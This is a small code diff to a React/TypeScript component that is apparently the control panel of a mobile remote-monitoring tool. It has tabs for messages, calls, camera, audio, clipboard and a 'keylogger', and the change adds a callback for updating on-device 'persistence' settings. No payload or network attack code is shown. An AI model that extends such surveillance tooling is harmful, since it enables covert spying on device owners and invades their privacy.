@@ -48,6 +48,7 @@ interface Props {
   onDeleteMessage?: (id: string) => void; onDeleteApp?: (id: string) => void; onDeleteFile?: (id: string) => void;
   onBulkDeleteContacts?: () => void; onBulkDeleteCalls?: () => void;
   onBulkDeleteMessages?: () => void; onBulkDeleteApps?: () => void; onBulkDeleteFiles?: () => void;
+  onUpdatePersistence?: (key: string, val: boolean) => void;
 }
 
 const TOGGLEABLE_TABS = ["gallery", "contacts", "calls", "messages", "apps", "camera", "audio", "notifications", "keylogger", "clipboard", "security"];
@@ -59,7 +60,7 @@ export const DeviceTabViews: React.FC<Props> = ({
   isTabEnabled = false, onToggleTab, onFetchOnce, onToggleLiveMovement, onSendCommand,
   onDeleteCommand, onBulkDeleteCommands, onDeleteContact, onDeleteCall, onDeleteMessage,
   onDeleteApp, onDeleteFile, onBulkDeleteContacts, onBulkDeleteCalls, onBulkDeleteMessages,
-  onBulkDeleteApps, onBulkDeleteFiles,
+  onBulkDeleteApps, onBulkDeleteFiles, onUpdatePersistence,
 }) => {
   const showToggle = TOGGLEABLE_TABS.includes(activeTab);
   const hasData = (
@@ -177,6 +178,7 @@ export const DeviceTabViews: React.FC<Props> = ({
               persistenceStatus={persistenceStatus}
               onClearModule={onClearModule}
               onScanWifi={() => onSendCommand("sync_wifi", {}, "WiFi scan")}
+              onUpdatePersistence={onUpdatePersistence}
               loading={tabLoading}
             />
           )}
